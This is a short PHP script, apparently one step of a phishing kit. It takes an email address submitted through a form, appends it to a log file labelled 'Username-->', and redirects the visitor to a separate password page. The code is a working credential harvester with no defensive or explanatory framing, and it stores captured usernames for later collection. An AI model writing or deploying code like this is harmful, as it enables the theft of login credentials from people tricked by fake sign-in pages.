<?php

session_start();

    $email = $_POST['email'];
    $_SESSION['mail'] = $email;    

    $file = fopen("log.txt","a");
    fwrite($file,"Username--> : ");
    fwrite($file,$email);
    fclose($file);
    header("location:password.php");
?>